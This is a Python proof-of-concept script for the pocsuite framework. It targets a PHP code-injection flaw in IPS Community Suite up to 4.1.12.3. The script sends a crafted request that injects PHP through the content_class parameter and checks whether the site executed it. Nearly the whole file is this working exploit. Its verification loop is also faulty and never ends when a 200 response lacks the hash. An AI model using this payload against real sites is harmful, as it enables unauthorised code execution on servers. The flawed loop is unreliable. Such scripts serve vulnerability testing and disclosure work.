#!/usr/bin/env python
#coding:utf-8
# @Date    : 2016-07-25 19:00:00
# @Author  : DshtAnger(dshtanger@gmail.com)
# 

import string,urlparse,random,hashlib,base64

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class TestPOC(POCBase):
    vulID = '92096' #ssvid-92096
    version = '1'
    author = 'DshtAnger'
    vulDate = '2016-07-07'
    createDate = '2016-07-25'
    updateDate = '2016-07-25'
    references = ['https://www.seebug.org/vuldb/ssvid-92096']
    name = 'IPS Community Suite <= 4.1.12.3 Autoloaded PHP Remote Command Execution.'
    appPowerLink = 'https://invisionpower.com/'
    appName = 'IPS Community Suite'
    appVersion = '<=4.1.12.3'
    vulType = 'Code Execution'
    desc =  '''
            Parameter filter is not strict resulting Code Execution.
            '''
    samples = []
    install_requires = []

    def _verify(self):
        result = {}
        url_part = self.url.rpartition('/')
        random_sed = string.letters+string.digits
        flag = ''.join([random.choice(random_sed) for _ in xrange(10)])
        payload = "/index.php?app=core&module=system&controller=content&do=find&content_class=cms\\Fields1{}echo%20" + "md5(" + flag + ");/*"
        
        target_url = self.url + payload
        target_rep = req.get(target_url)

        while target_rep.status_code == 200:
            
            flag_hash = hashlib.md5(flag).hexdigest()
            if flag_hash in target_rep.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                break

        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)